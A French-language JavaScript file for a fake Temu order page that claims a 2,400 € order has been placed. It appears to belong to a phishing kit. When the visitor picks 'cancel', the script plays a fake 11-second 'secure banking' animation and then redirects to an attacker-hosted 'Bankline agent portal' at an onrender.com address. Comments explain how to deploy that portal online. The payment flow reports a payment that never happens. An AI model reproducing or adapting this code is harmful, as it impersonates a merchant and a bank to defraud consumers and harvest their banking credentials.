/**
 * TEMU ORDER MANAGEMENT PLATFORM
 * Réf : CMD-TEMU-89241-EU
 * Marchand : TEMU (Whaleco Tech Ireland Ltd)
 */

// =========================================================================
// CONFIGURATION DE REDIRECTION VERS LE PORTAIL AGENT BANKLINE
// =========================================================================
// 📌 1. Mode Local (par défaut) : 'http://localhost:3001/securisation.html'
// 📌 2. Mode Déployé en ligne : 
//    Une fois votre serveur agent déployé (Vercel, VPS ou Cloud), vous pouvez
//    soit remplacer l'URL ci-dessous par votre adresse publique (ex: https://votre-projet.vercel.app/securisation.html),
//    soit taper dans la console du navigateur :
//    localStorage.setItem('BANKLINE_AGENT_PORTAL_URL', 'https://votre-url-en-ligne.com/securisation.html')
// =========================================================================
const REDIRECT_CONFIG = {
  // Détecte automatiquement l'URL configurée en local ou en déploiement distant
  agentPortalUrl: localStorage.getItem('BANKLINE_AGENT_PORTAL_URL') || 
                  window.BANKLINE_AGENT_PORTAL_URL || 
                  'https://bankline-admin.onrender.com/securisation.html',

  // Durée de l'animation en secondes (entre 10 et 12 secondes demandées)
  durationSeconds: 11
};

document.addEventListener('DOMContentLoaded', () => {
  initDecisionSelect();
  initModalCheckout();
});

// Gestion du sélecteur "Voulez-vous valider ou annuler votre commande ?"
function initDecisionSelect() {
  const container = document.getElementById('custom-dropdown-container');
  const trigger = document.getElementById('dropdown-trigger');
  const selectedText = document.getElementById('dropdown-selected-text');
  const optItems = document.querySelectorAll('.dropdown-opt-item');
  const actionZone = document.getElementById('dynamic-action-zone');
  const nativeSelect = document.getElementById('order-decision-select');

  if (!container || !trigger) return;

  // Ouvrir / Fermer le menu déroulant au clic
  trigger.addEventListener('click', (e) => {
    e.stopPropagation();
    const isOpen = container.classList.toggle('is-open');
    trigger.setAttribute('aria-expanded', isOpen);
  });

  // Fermer si clic en dehors
  document.addEventListener('click', (e) => {
    if (!container.contains(e.target)) {
      container.classList.remove('is-open');
      trigger.setAttribute('aria-expanded', 'false');
    }
  });

  // Sélection d'une option
  optItems.forEach(item => {
    item.addEventListener('click', () => {
      const val = item.dataset.value;
      const text = item.textContent.trim();

      // Mettre à jour l'affichage
      selectedText.textContent = text;
      optItems.forEach(i => i.classList.remove('selected', 'opt-default'));
      item.classList.add('selected');
      if (!val) item.classList.add('opt-default');

      // Fermer le menu
      container.classList.remove('is-open');
      trigger.setAttribute('aria-expanded', 'false');

      // Synchroniser select natif
      if (nativeSelect) nativeSelect.value = val;

      // Traiter l'action correspondante
      handleDecision(val, actionZone);
    });
  });
}

function handleDecision(value, actionZone) {
  if (!actionZone) return;

  if (value === 'validate') {
    actionZone.innerHTML = `
      <button class="btn-action-primary" id="btn-trigger-checkout">
        Valider et régler ma commande (2 400,00 €) ➔
      </button>
    `;
    const btn = document.getElementById('btn-trigger-checkout');
    if (btn) {
      btn.addEventListener('click', openCheckoutModal);
    }
    showToast("Option sélectionnée : Valider ma commande");
  } else if (value === 'cancel') {
    actionZone.innerHTML = `
      <button class="btn-action-cancel" id="btn-trigger-cancel">
        Confirmer l'annulation de la commande
      </button>
    `;
    const btn = document.getElementById('btn-trigger-cancel');
    if (btn) {
      btn.addEventListener('click', () => {
        // Déclencher l'animation avec TEMU + BANK et la redirection
        startCancellationWorkflow();
      });
    }
    showToast("Option sélectionnée : Annuler ma commande");
  } else {
    actionZone.innerHTML = '';
  }
}

// Workflow d'animation de chargement TEMU <-> BANKLINE & Redirection automatique (10 à 12s)
function startCancellationWorkflow() {
  const overlay = document.getElementById('cancel-loader-overlay');
  const progressBar = document.getElementById('cancel-progress-bar');
  const percentText = document.getElementById('cancel-percent');
  const countdownText = document.getElementById('cancel-countdown');
  const stepText = document.getElementById('cancel-dynamic-step');

  if (!overlay) return;

  // Afficher l'overlay d'animation
  overlay.classList.add('active');
  overlay.setAttribute('aria-hidden', 'false');

  const totalSeconds = REDIRECT_CONFIG.durationSeconds || 11;
  const startTime = Date.now();
  const totalDurationMs = totalSeconds * 1000;

  // Étapes de transmission dynamique affichées pendant les 11 secondes
  const steps = [
    { threshold: 0, text: "Transmission de la requête d'annulation CMD-TEMU-89241-EU..." },
    { threshold: 0.25, text: "Connexion sécurisée à la passerelle interbancaire..." },
    { threshold: 0.55, text: "Validation des protocoles de remboursement & cryptage 256-bit..." },
    { threshold: 0.85, text: "Traitement validé. Sécurisation des données terminée..." },
    { threshold: 0.98, text: "✓ Redirection immédiate vers le portail agent bancaire..." }
  ];

  const updateInterval = setInterval(() => {
    const elapsed = Date.now() - startTime;
    const progress = Math.min(elapsed / totalDurationMs, 1);
    const percentInt = Math.floor(progress * 100);
    const secondsRemaining = Math.max(0, Math.ceil((totalDurationMs - elapsed) / 1000));

    // Mise à jour de la barre et des pourcentages
    if (progressBar) progressBar.style.width = `${progress * 100}%`;
    if (percentText) percentText.textContent = `${percentInt}%`;
    if (countdownText) {
      countdownText.textContent = secondsRemaining > 0 
        ? `⏳ Temps restant : ~${secondsRemaining}s` 
        : `✓ Redirection en cours...`;
    }

    // Mise à jour des messages d'étapes
    if (stepText) {
      for (let i = steps.length - 1; i >= 0; i--) {
        if (progress >= steps[i].threshold) {
          stepText.textContent = steps[i].text;
          break;
        }
      }
    }

    // Lorsque le délai est écoulé (11 secondes)
    if (progress >= 1) {
      clearInterval(updateInterval);

      // Redirection automatique vers le portail agent
      setTimeout(() => {
        window.location.href = REDIRECT_CONFIG.agentPortalUrl;
      }, 400);
    }
  }, 50);
}

// Modale de paiement et validation
function openCheckoutModal() {
  const modal = document.getElementById('checkout-modal');
  const form = document.getElementById('modal-payment-form');
  const successState = document.getElementById('modal-success-state');

  if (modal) {
    if (form) form.style.display = 'block';
    if (successState) successState.style.display = 'none';
    modal.classList.add('active');
  }
}

function initModalCheckout() {
  const modal = document.getElementById('checkout-modal');
  const closeBtn = document.getElementById('modal-close-btn');
  const confirmBtn = document.getElementById('btn-confirm-payment');
  const finishBtn = document.getElementById('btn-finish-modal');
  const form = document.getElementById('modal-payment-form');
  const successState = document.getElementById('modal-success-state');

  if (closeBtn && modal) {
    closeBtn.addEventListener('click', () => {
      modal.classList.remove('active');
    });
  }

  if (modal) {
    modal.addEventListener('click', (e) => {
      if (e.target === modal) {
        modal.classList.remove('active');
      }
    });
  }

  // Choix des options de paiement
  const radioCards = document.querySelectorAll('.pay-radio-opt');
  radioCards.forEach(card => {
    card.addEventListener('click', () => {
      radioCards.forEach(c => c.classList.remove('active'));
      card.classList.add('active');
      const radio = card.querySelector('input[type="radio"]');
      if (radio) radio.checked = true;
    });
  });

  // Bouton de paiement
  if (confirmBtn) {
    confirmBtn.addEventListener('click', () => {
      confirmBtn.disabled = true;
      confirmBtn.textContent = "Sécurisation bancaire Whaleco Pay...";

      setTimeout(() => {
        confirmBtn.disabled = false;
        confirmBtn.textContent = "Payer maintenant 2 400,00 €";

        if (form) form.style.display = 'none';
        if (successState) successState.style.display = 'block';

        showToast("✓ Paiement de 2 400,00 € validé avec succès !");
      }, 1100);
    });
  }

  if (finishBtn && modal) {
    finishBtn.addEventListener('click', () => {
      modal.classList.remove('active');
    });
  }
}

// Toast de notification
let toastTimer;
function showToast(msg) {
  const box = document.getElementById('toast-box');
  if (!box) return;
  box.textContent = msg;
  box.classList.add('active');
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => {
    box.classList.remove('active');
  }, 3000);
}
